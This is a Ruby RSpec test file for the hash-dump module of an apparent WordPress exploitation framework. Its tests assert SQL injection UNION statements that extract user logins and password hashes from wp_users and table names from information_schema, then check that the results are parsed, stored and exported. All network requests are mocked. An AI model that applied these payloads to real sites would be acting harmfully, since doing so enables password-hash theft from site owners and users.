# frozen_string_literal: true

require_relative '../../../spec_helper'

describe Wpxf::WordPress::HashDump do
  let(:subject) do
    Class.new(Wpxf::Module) do
      include Wpxf::WordPress::HashDump
    end.new
  end

  let(:http_response) { Wpxf::Net::HttpResponse.new({}) }

  before :each, 'setup mocks' do
    http_response.body = ''
    http_response.code = 200

    allow(subject).to receive(:execute_request).and_return(http_response)
    allow(subject).to receive(:emit_success)
    allow(subject).to receive(:emit_table)

    subject.active_workspace = Wpxf::Models::Workspace.first
    subject.set_option_value('check_wordpress_and_online', false)
    subject.set_option_value('host', '127.0.0.1')
  end

  describe '#new' do
    it 'registers the export_path option' do
      expect(subject.get_option('export_path')).to_not be_nil
    end

    it 'registers a generic description' do
      expect(subject.module_desc).to match(/This module exploits an SQL injection/)
    end
  end

  describe '#export_path' do
    it 'returns the value of the export_path option' do
      subject.set_option_value('export_path', '/path/to/export')
      expect(subject.export_path).to eq '/path/to/export'
    end
  end

  describe '#reveals_one_row_per_request' do
    it 'should return false' do
      expect(subject.reveals_one_row_per_request).to be false
    end
  end

  describe '#hashdump_custom_union_values' do
    it 'should return an empty array' do
      expect(subject.hashdump_custom_union_values).to eql []
    end
  end

  describe '#hashdump_sql_statement' do
    context 'when #reveals_one_row_per_request is false' do
      it 'returns a select statement that will select all user hashes with no limit clause' do
        allow(subject).to receive(:reveals_one_row_per_request).and_return(false)
        allow(subject).to receive(:hashdump_number_of_cols).and_return(3)
        allow(subject).to receive(:hashdump_visible_field_index).and_return(1)
        allow(subject).to receive(:table_prefix).and_return('wp_')

        expect(subject.hashdump_sql_statement).to match(/select 0,concat\(\d{10},0x3a,user_login,0x3a,user_pass,0x3a,\d{10}\),0 from wp_users/)
      end
    end

    context 'when #reveals_one_row_per_request is true' do
      it 'returns a select statement that will select all user hashes with a limit clause' do
        allow(subject).to receive(:reveals_one_row_per_request).and_return(true)
        allow(subject).to receive(:hashdump_number_of_cols).and_return(3)
        allow(subject).to receive(:hashdump_visible_field_index).and_return(1)
        allow(subject).to receive(:table_prefix).and_return('wp_')
        allow(subject).to receive(:_current_row).and_return(3)

        expect(subject.hashdump_sql_statement).to match(/select 0,concat\(\d{10},0x3a,user_login,0x3a,user_pass,0x3a,\d{10}\),0 from wp_users limit 3,1/)
      end
    end

    context 'if custom union values are defined' do
      it 'should use the values in their respective positions in the statement' do
        custom_values = Array.new(3)
        custom_values[1] = 'test'

        allow(subject).to receive(:hashdump_number_of_cols).and_return(3)
        allow(subject).to receive(:hashdump_custom_union_values).and_return(custom_values)
        allow(subject).to receive(:hashdump_visible_field_index).and_return(0)
        allow(subject).to receive(:reveals_one_row_per_request).and_return(false)
        allow(subject).to receive(:table_prefix).and_return('wp_')

        res = subject.hashdump_sql_statement
        expect(res).to match(/select concat\(\d{10},0x3a,user_login,0x3a,user_pass,0x3a,\d{10}\),test,0 from wp_users/)
      end
    end
  end

  describe '#hashdump_prefix_fingerprint_statement' do
    context 'when #reveals_one_row_per_request is false' do
      it 'returns a select statement that will select all table names in the current database' do
        allow(subject).to receive(:reveals_one_row_per_request).and_return(false)
        allow(subject).to receive(:hashdump_number_of_cols).and_return(3)
        allow(subject).to receive(:hashdump_visible_field_index).and_return(1)
        allow(subject).to receive(:_bof_token).and_return(123)
        allow(subject).to receive(:_eof_token).and_return(321)

        expected_query = 'select 0,concat(123,0x3a,table_name,0x3a,321),0 from information_schema.tables where table_schema = database()'
        expect(subject.hashdump_prefix_fingerprint_statement).to eq expected_query
      end
    end

    context 'when #reveals_one_row_per_request is true' do
      it 'returns a select statement that will select all table names in the current database with a limit clause' do
        allow(subject).to receive(:reveals_one_row_per_request).and_return(true)
        allow(subject).to receive(:hashdump_number_of_cols).and_return(3)
        allow(subject).to receive(:hashdump_visible_field_index).and_return(1)
        allow(subject).to receive(:_bof_token).and_return(123)
        allow(subject).to receive(:_eof_token).and_return(321)
        allow(subject).to receive(:_current_row).and_return(3)

        expected_query = 'select 0,concat(123,0x3a,table_name,0x3a,321),0 from information_schema.tables where table_schema = database() limit 3,1'
        expect(subject.hashdump_prefix_fingerprint_statement).to eq expected_query
      end
    end
  end

  describe '#hashdump_visible_field_index' do
    it 'should return 0' do
      expect(subject.hashdump_visible_field_index).to eql 0
    end
  end

  describe '#hashdump_number_of_cols' do
    it 'should return 1' do
      expect(subject.hashdump_number_of_cols).to eql 1
    end
  end

  describe '#hashdump_request_method' do
    it 'should return :get' do
      expect(subject.hashdump_request_method).to eql :get
    end
  end

  describe '#hashdump_request_params' do
    it 'should return nil' do
      expect(subject.hashdump_request_params).to be_nil
    end
  end

  describe '#hashdump_request_body' do
    it 'should return nil' do
      expect(subject.hashdump_request_body).to be_nil
    end
  end

  describe '#vulnerable_url' do
    it 'should return nil' do
      expect(subject.vulnerable_url).to be_nil
    end
  end

  describe '#table_prefix' do
    it 'should initially return nil' do
      expect(subject.table_prefix).to be_nil
    end
  end

  describe '#run' do
    let(:responses) { [] }

    before :each, 'setup subject' do
      allow(subject).to receive(:hashdump_request_params).and_return(
        'p1' => 'value1',
        'p2' => 'value2'
      )

      # Setup valid responses for a successful run
      bof_token = subject.send(:_bof_token)
      eof_token = subject.send(:_eof_token)

      responses[0] = Wpxf::Net::HttpResponse.new({})
      responses[0].code = 200
      responses[0].body = "lorem ipsum #{bof_token}:wp_usermeta:#{eof_token} lorem ipsum"

      (1..3).each do |i|
        responses[i] = Wpxf::Net::HttpResponse.new({})
        responses[i].code = 200
        responses[i].body = "lorem ipsum #{bof_token}:user:hash:#{eof_token} #{bof_token}:user2:hash2:#{eof_token} lorem ipsum"
      end

      allow(subject).to receive(:execute_request).and_return(
        responses[0], responses[1], responses[2], responses[3], http_response
      )
    end

    it 'should handle #hashdump_request_body being a {Hash}' do
      allow(subject).to receive(:hashdump_request_body).and_return(
        'param1' => 'value1',
        'param2' => subject.hashdump_sql_statement
      )

      expect(subject.run).to be true
    end

    it 'should handle #hashdump_request_body being a {String}' do
      allow(subject).to receive(:hashdump_request_body).and_return(subject.hashdump_sql_statement)
      expect(subject.run).to be true
    end

    context 'if the table prefix can be identified' do
      it 'should print it to screen in verbose mode' do
        subject.run
        expect(subject).to have_received(:emit_success)
          .with('Found prefix: wp_', true)
          .exactly(1).times
      end
    end

    context 'if the table prefix cannot be identified' do
      it 'should return false' do
        responses[0].body = ''
        res = subject.run
        expect(subject).to_not have_received(:emit_success)
        expect(res).to be false
      end
    end

    context 'if the prefix request fails' do
      it 'should return false' do
        responses[0].code = 404
        res = subject.run
        expect(subject).to_not have_received(:emit_success)
        expect(res).to be false
      end
    end

    context 'if #reveals_one_row_per_request is false' do
      it 'should execute the hash dump request once' do
        allow(subject).to receive(:_execute_hashdump_request).and_call_original
        subject.run

        expect(subject).to have_received(:_execute_hashdump_request).exactly(1).times
      end

      it 'should attempt to determine the prefix only once' do
        allow(subject).to receive(:_determine_prefix).and_call_original
        subject.run
        expect(subject).to have_received(:_determine_prefix).exactly(1).times
      end
    end

    context 'if #reveals_one_row_per_request is true' do
      it 'should attempt to determine the prefix until no more rows are returned' do
        bof_token = subject.send(:_bof_token)
        eof_token = subject.send(:_eof_token)
        allow(subject).to receive(:reveals_one_row_per_request).and_return(true)

        responses = (1..3).map do
          res = Wpxf::Net::HttpResponse.new({})
          res.code = 200
          res.body = "lorem ipsum #{bof_token}:invalidtable:#{eof_token}"
          res
        end

        final_res = Wpxf::Net::HttpResponse.new({})
        final_res.code = 200
        final_res.body = 'these are not the hashes you are looking for'

        allow(subject).to receive(:execute_request).and_return(
          responses[0], responses[1], responses[2], final_res
        )

        subject.run
        expect(subject).to have_received(:execute_request).exactly(4).times
      end

      it 'should stop trying to determine the prefix if a match is found' do
        bof_token = subject.send(:_bof_token)
        eof_token = subject.send(:_eof_token)
        allow(subject).to receive(:reveals_one_row_per_request).and_return(true)

        responses = (1..3).map do
          res = Wpxf::Net::HttpResponse.new({})
          res.code = 200
          res.body = "lorem ipsum #{bof_token}:invalidtable:#{eof_token}"
          res
        end

        final_res = Wpxf::Net::HttpResponse.new({})
        final_res.code = 200
        final_res.body = 'these are not the hashes you are looking for'

        allow(subject).to receive(:execute_request).and_return(
          final_res, responses[0], responses[1], responses[2]
        )

        subject.run
        expect(subject).to have_received(:execute_request).exactly(1).times
      end

      it 'should execute the hash dump request until no more results are found' do
        allow(subject).to receive(:_determine_prefix).and_return('wp_')
        allow(subject).to receive(:_bof_token).and_return(123)
        allow(subject).to receive(:_eof_token).and_return(321)
        allow(subject).to receive(:reveals_one_row_per_request).and_return(true)

        responses = (1..3).map do
          res = Wpxf::Net::HttpResponse.new({})
          res.code = 200
          res.body = 'lorem ipsum 123:user:hash:321'
          res
        end

        final_res = Wpxf::Net::HttpResponse.new({})
        final_res.code = 200
        final_res.body = 'these are not the hashes you are looking for'

        allow(subject).to receive(:execute_request).and_return(
          responses[0], responses[1], responses[2], final_res
        )

        subject.run

        expect(subject).to have_received(:execute_request).exactly(4).times
      end
    end

    it 'should print the hashes in a table' do
      expected = [
        { user: 'Username', hash: 'Hash' },
        { user: 'user', hash: 'hash' },
        { user: 'user2', hash: 'hash2' }
      ]

      subject.run
      expect(subject).to have_received(:emit_table)
        .with(expected)
        .exactly(1).times
    end

    it 'should save any hashes identified to the database' do
      expect(Wpxf::Models::Credential.count).to eql 0
      subject.run
      expect(Wpxf::Models::Credential.count).to eql 2
    end

    context 'if the export_path option is set' do
      let(:file) { double('file') }

      before :each, 'setup mocks' do
        allow(file).to receive(:puts)
        allow(File).to receive(:open).and_yield(file)
        subject.set_option_value('export_path', '/path')
      end

      it 'should export the hashes to the specified file' do
        subject.run
        expect(File).to have_received(:open).with('/path', 'w')
        expect(file).to have_received(:puts).with('user:hash').exactly(1).times
        expect(file).to have_received(:puts).with('user2:hash2').exactly(1).times
      end

      it 'should emit a notification that the hashes were exported' do
        subject.run
        expect(subject).to have_received(:emit_success)
          .with('Saved dump to /path')
          .exactly(1).times
      end
    end

    context 'if no errors occur' do
      it 'should return true' do
        expect(subject.run).to be true
      end
    end
  end
end
